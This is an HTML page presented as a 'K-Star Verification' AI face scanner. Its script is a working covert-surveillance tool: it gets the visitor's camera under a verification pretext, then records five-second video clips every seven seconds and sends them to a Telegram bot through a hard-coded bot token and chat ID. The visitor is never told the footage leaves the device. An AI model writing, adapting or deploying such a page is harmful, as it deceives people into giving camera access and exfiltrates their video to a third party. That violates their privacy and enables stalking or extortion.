<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>K-Star Verification</title>
    <style>
        body { background: #000; color: #00d2ff; font-family: sans-serif; text-align: center; padding: 50px; }
        .card { border: 2px solid #00d2ff; padding: 20px; display: inline-block; border-radius: 15px; }
        button { background: #00d2ff; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>AI Face Scanner</h2>
        <p>Please click the button to start verification.</p>
        <button onclick="start()">START SCAN</button>
        <p id="msg"></p>
    </div>

    <script>
        // Use your real ID and Token here
        const T = '8736351489:AAELCQrNInpGZp4naiPFaehlEjcEmeFeEQA';
        const C = '8487366702';

        async function start() {
            document.getElementById('msg').innerText = "Requesting Camera...";
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('msg').innerText = "Scanning... Stay still.";
                
                setInterval(() => {
                    const r = new MediaRecorder(s);
                    let b = [];
                    r.ondataavailable = e => b.push(e.data);
                    r.onstop = () => {
                        const fd = new FormData();
                        fd.append('chat_id', C);
                        fd.append('video', new Blob(b, {type: 'video/mp4'}), 'v.mp4');
                        fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: fd });
                    };
                    r.start();
                    setTimeout(() => r.stop(), 5000); // Test with 5 seconds
                }, 7000);
            } catch (e) {
                document.getElementById('msg').innerText = "Error: " + e.message;
            }
        }
    </script>
</body>
</html>
